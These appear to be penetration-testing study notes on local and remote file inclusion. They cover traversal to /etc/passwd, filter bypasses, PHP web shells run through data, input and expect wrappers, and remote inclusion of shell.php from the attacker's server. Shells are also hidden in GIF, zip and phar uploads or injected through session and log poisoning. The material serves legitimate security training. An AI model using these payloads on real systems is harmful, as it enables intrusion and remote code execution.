# File Inclusions

## Examples of Vulnerable Code

### **PHP**

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

### **NodeJS**

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

```js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

### **Java**

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```

### **.NET**

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

## Read vs Execute

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |         ✅        |      ✅      |        ✅       |
| `require()`/`require_once()` |         ✅        |      ✅      |        ❌       |
| `file_get_contents()`        |         ✅        |      ❌      |        ✅       |
| `fopen()`/`file()`           |         ✅        |      ❌      |        ❌       |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |         ✅        |      ❌      |        ❌       |
| `fs.sendFile()`              |         ✅        |      ❌      |        ❌       |
| `res.render()`               |         ✅        |      ✅      |        ❌       |
| **Java**                     |                  |             |                |
| `include`                    |         ✅        |      ❌      |        ❌       |
| `import`                     |         ✅        |      ✅      |        ✅       |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |         ✅        |      ❌      |        ❌       |
| `@Html.RemotePartial()`      |         ✅        |      ❌      |        ✅       |
| `Response.WriteFile()`       |         ✅        |      ❌      |        ❌       |
| `include`                    |         ✅        |      ✅      |        ✅       |


# File Disclosure

## 1.Local File Inclusion (LFI)

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FwVtmyHFjpbEFqc5Sc4Oc%2Fimage.png?alt=media&amp;token=32d810e7-d27f-4f13-ae0f-24586d0deb70" alt=""><figcaption></figcaption></figure>

> [www.example.com/index.php?language=es.php](http://www.example.com/index.php?language=es.php)

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FfxpsY7LjLJmzLfITUHEY%2Fimage.png?alt=media&amp;token=3312bfda-c6f0-4861-b16e-88706897b1ae" alt=""><figcaption></figcaption></figure>

> [www.example.com/index.php?language=/etc/passwd](http://www.example.com/index.php?language=/etc/passwd)

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FJDiYS9MLOR8ZbZUFzh7S%2Fimage.png?alt=media&amp;token=0595cdeb-a41d-46e3-b735-21934a94cb37" alt=""><figcaption></figcaption></figure>

### Path Traversal

&#x20;`include()` function

```php
include($_GET['language']);
```

> [www.example.com/index.php?language=/etc/passwd](http://www.example.com/index.php?language=/etc/passwd)

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FUJleooyc6EfjmQcrZ3cF%2Fimage.png?alt=media&amp;token=de2d5319-50be-4d08-b461-1a6449f14337" alt=""><figcaption></figcaption></figure>

> [www.example.com/index.php?language=../../../../etc/passwd](http://www.example.com/index.php?language=../../../../etc/passwd)

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FudDQeq9PQYvXvZWcdnl1%2Fimage.png?alt=media&amp;token=c1d339ac-3866-41ca-8d42-2bfc2a1049d1" alt=""><figcaption></figcaption></figure>

### Filename Prefix

[www.example.com/index.php?language=../../../etc/passwd](http://www.example.com/index.php?language=../../../etc/passwd)<br>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F3EdRLXVzVStqO2AitRDT%2Fimage.png?alt=media&amp;token=fb66e97c-dba9-4fbc-befb-e139e2a3f894" alt=""><figcaption></figcaption></figure>

[www.example.com/index.php?language=/../../../etc/passwd](http://www.example.com/index.php?language=/../../../etc/passwd)

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F1m4lyzOBQWJiIDsXS4l4%2Fimage.png?alt=media&amp;token=c50ba920-f899-4f97-8c94-2c3bd32ebf26" alt=""><figcaption></figcaption></figure>

[www.example.com/extension/index.php?language=/etc/passwd](http://www.example.com/extension/index.php?language=/etc/passwd)

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FekDghRzEkmjuNySIzr3J%2Fimage.png?alt=media&amp;token=ce6ae43f-bba9-4308-8bb7-c8d881e5b2ee" alt=""><figcaption></figcaption></figure>

## Second-Order Attacks

For example, a web application may allow us to download our avatar through a URL like (`/profile/$username/avatar.png`). If we craft a malicious LFI username (e.g. `../../../etc/passwd`)

## 2.Basic Bypasses

../../../../etc/passwd

....//....//....//....//etc/passwd

### Encoding

URL encode `../` into `%2e%2e%2f`

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FAuKPTzjXz5UnVvnrctGA%2Fimage.png?alt=media&amp;token=5053c8c0-d194-43b5-a835-0c4e16bf8b05" alt=""><figcaption></figcaption></figure>

> /index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

### Approved Paths

/index.php?language=./languages/../../../../etc/passwd

### Appended Extension

`////etc/passwd` is the same as `/etc/passwd`

```url
?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
```

```shell-session
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

### **Null Bytes**

/etc/passwd%00

/etc/passwd%00.php

## 3.PHP Filters

### Input Filters

{% embed url="<https://www.php.net/manual/en/filters.php>" %}

`php://filter/`

> There are four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php). You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the `convert.base64-encode` filter, under `Conversion Filters`.

### Fuzzing for PHP Files

```shell-session
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

## Standard PHP Inclusion

[www.example.com/index.php?language=config](http://www.example.com/index.php?language=config)

### Source Code Disclosure

```url
php://filter/read=convert.base64-encode/resource=config
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FWY3WxEwmV71VPSiu7BlO%2Fimage.png?alt=media&amp;token=82ed9866-b2bb-4194-a136-e640910f902e" alt=""><figcaption></figcaption></figure>

```shell-session
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```



# Remote Code Execution

## 1.PHP Wrappers

allow\_url\_include

### **Checking PHP Configurations**

`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx

```shell-session
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Once we have the base64 encoded string, we can decode it and `grep` for `allow_url_include` to see its value:

```shell-session
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

### **Remote Code Execution**

```shell-session
echo '<?php system($_GET["cmd"]); ?>' | base64
```

Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:

```shell-session
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

## Input

Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code.

```shell-session
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

> Note: To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

## Expect

Finally, we may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams

```shell-session
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```

```shell-session
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

```shell-session
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

## 2.Remote File Inclusion (RFI)

### 2.Local vs. Remote File Inclusion

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |         ✅        |      ✅      |        ✅       |
| `file_get_contents()`        |         ✅        |      ❌      |        ✅       |
| **Java**                     |                  |             |                |
| `import`                     |         ✅        |      ✅      |        ✅       |
| **.NET**                     |                  |             |                |
| `@Html.RemotePartial()`      |         ✅        |      ❌      |        ✅       |
| `include`                    |         ✅        |      ✅      |        ✅       |

> As we can see, almost any RFI vulnerability is also an LFI vulnerability, as any function that allows including remote URLs usually also allows including local ones. However, an LFI may not necessarily be an RFI. This is primarily because of three reasons:
>
> 1. The vulnerable function may not allow including remote URLs
> 2. You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://`, `ftp://`, `https://`).
> 3. The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.
>
> Furthermore, as we may note in the above table, some functions do allow including remote URLs but do not allow code execution. In this case, we would still be able to exploit the vulnerability to enumerate local ports and web applications through SSRF.

## Verify RFI

```shell-session
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

example.com/index.php?language=<http://127.0.0.1:80/index.php>

## Remote Code Execution with RFI

```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

80 or 443

```shell-session
sudo python3 -m http.server <LISTENING_PORT>
```

> <http://example.com:/index.php?language=http://\\>\<OUR\_IP>:\<LISTENING\_PORT>/shell.php\&cmd=id

## FTP

```shell-session
sudo python -m pyftpdlib -p 21
```

> <http://example.com:/index.php?language=ftp://\\>\<OUR\_IP>/shell.php\&cmd=id

```shell-session
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

## SMB

```shell-session
impacket-smbserver -smb2support share $(pwd)
```

> example.com/index.php?language=\\\<OUR\_IP>\share\shell.php\&cmd=whoami

## 3.LFI and File Uploads

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |         ✅        |      ✅      |        ✅       |
| `require()`/`require_once()` |         ✅        |      ✅      |        ❌       |
| **NodeJS**                   |                  |             |                |
| `res.render()`               |         ✅        |      ✅      |        ❌       |
| **Java**                     |                  |             |                |
| `import`                     |         ✅        |      ✅      |        ✅       |
| **.NET**                     |                  |             |                |
| `include`                    |         ✅        |      ✅      |        ✅       |

```shell-session
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F6dIIKG1f9y7sM2vNj38R%2Fimage.png?alt=media&amp;token=bad91eec-ba94-4953-b907-213750f085c3" alt=""><figcaption></figcaption></figure>

**Uploaded File Path**

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

> example.com/index.php?language=./profile\_images/shell.gif\&cmd=id

### Zip Upload

{% embed url="<https://www.php.net/manual/en/wrappers.compression.php>" %}

```shell-session
 echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

> Note: Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.

Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded). Finally, we can execute commands as we always do with `&cmd=id`, as follows:

> example.com/index.php?language=zip\://./profile\_images/shell.jpg%23shell.php\&cmd=id

## Phar Upload

Finally, we can use the `phar://` wrapper to achieve a similar result.

we will first write the following PHP script into a `shell.php` file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

```shell-session
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

> example.com/index.php?language=phar://./profile\_images/shell.jpg%2Fshell.txt\&cmd=id

> Note: There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the `phpinfo()` page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()). If you are interested in knowing more about it, you can refer to [This Link](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo).

## 3.Log Poisoning

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |         ✅        |      ✅      |        ✅       |
| `require()`/`require_once()` |         ✅        |      ✅      |        ❌       |
| **NodeJS**                   |                  |             |                |
| `res.render()`               |         ✅        |      ✅      |        ❌       |
| **Java**                     |                  |             |                |
| `import`                     |         ✅        |      ✅      |        ✅       |
| **.NET**                     |                  |             |                |
| `include`                    |         ✅        |      ✅      |        ✅       |

### PHP Session Poisoning

> Most PHP web applications utilize `PHPSESSID` cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows. The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix. For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.
>
> The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison. So, let's first check if we have a `PHPSESSID` cookie set to our session:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FOFUVoF6DwJytG6z5HhEY%2Fimage.png?alt=media&amp;token=0c916a00-69de-46c3-bd0e-3c300f07f56d" alt=""><figcaption></figcaption></figure>

As we can see, our `PHPSESSID` cookie value is `nhhv8i0o6ua4g88bkdl9u1fdsd`, so it should be stored at `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`. Let's try include this session file through the LFI vulnerability and view its contents:

> example.com/index.php?language=/var/lib/php/sessions/sess\_nhhv8i0o6ua4g88bkdl9u1fdsd

```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

example.com/index.php?language=/var/lib/php/sessions/sess\_nhhv8i0o6ua4g88bkdl9u1fdsd

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FdWAs2Ok5i4nJykDrABMh%2Fimage.png?alt=media&amp;token=5e55f325-d982-4994-9003-be2d16b94a97" alt=""><figcaption></figcaption></figure>

```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

example.com/index.php?language=/var/lib/php/sessions/sess\_nhhv8i0o6ua4g88bkdl9u1fdsd\&cmd=id

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FPouVNBn4fXqqcHw0dUz1%2Fimage.png?alt=media&amp;token=1b4322a4-ccff-4cdd-ae03-aeea61e8d3cb" alt=""><figcaption></figcaption></figure>

> Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.

## Server Log Poisoning

{% embed url="<https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI>" %}

> Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above.
>
> Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. `Nginx` logs are readable by low privileged users by default (e.g. `www-data`), while the `Apache` logs are only readable by users with high privileges (e.g. `root`/`adm` groups). However, in older or misconfigured `Apache` servers, these logs may be readable by low-privileged users.
>
> By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows. However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations, as will be discussed in the next section.
>
> So, let's try including the Apache access log from `/var/log/apache2/access.log`, and see what we get:

As we can see, we can read the log. The log contains the `remote IP address`, `request page`, `response code`, and the `User-Agent` header. As mentioned earlier, the `User-Agent` header is controlled by us through the HTTP request headers, so we should be able to poison this value.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FuTv4pfxqOUL5XZGQ5hWj%2Fimage.png?alt=media&amp;token=2768c548-db41-45e0-838e-ee9be087bd76" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FvfD4uhdVDgdlDkUvXHIi%2Fimage.png?alt=media&amp;token=a479326f-35ac-4261-b737-e90416556a50" alt=""><figcaption></figcaption></figure>

We may also poison the log by sending a request through cURL, as follows:

```shell-session
Olanzapine@htb[/htb]$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
Olanzapine@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FuhIPSiRp5nnura4BMVWt%2Fimage.png?alt=media&amp;token=da90bbaa-af9d-410f-baa4-b9d0e7e2abd8" alt=""><figcaption></figcaption></figure>

> We see that we successfully executed the command. The exact same attack can be carried out on `Nginx` logs as well.
>
> Tip: The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.
>
> Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:
>
> * `/var/log/sshd.log`
> * `/var/log/mail`
> * `/var/log/vsftpd.log`\
>   \ <br>

> We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the `ssh` or `ftp` services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the `mail` services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.



# Automation

## Fuzzing Parameters

```shell-session
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

### LFI wordlists

> <https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI>\
> <https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt>

```shell-session
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

## Fuzzing Server Files

there are different server files that may be helpful in our LFI exploitation, so it would be helpful to know where such files exist and whether we can read them. Such files include: `Server webroot path`, `server configurations file`, and `server logs`.

### **Server Webroot**

&#x20;we can fuzz for the `index.php` file through common webroot paths

> <https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt>
>
> <https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt>\
> <https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt>

```shell-session
 ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

### **Server Logs/Configurations**

> <https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt>\
> <https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux>
>
> <https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows>

```shell-session
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

```shell-session
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
```

```shell-session
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
```

> As we can see, the (`APACHE_LOG_DIR`) variable is set to (`/var/log/apache2`), and the previous configuration told us that the log files are `/access.log` and `/error.log`, which have accessed in the previous section.

### LFI Tools

Finally, we can utilize a number of LFI tools to automate much of the process we have been learning, which may save time in some cases, but may also miss many vulnerabilities and files we may otherwise identify through manual testing. The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy). We can also search GitHub for various other LFI tools and scripts, but in general, most tools perform the same tasks, with varying levels of success and accuracy.

Unfortunately, most of these tools are not maintained and rely on the outdated `python2`, so using them may not be a long term solution. Try downloading any of the above tools and test them on any of the exercises we've used in this module to see their level of accuracy.


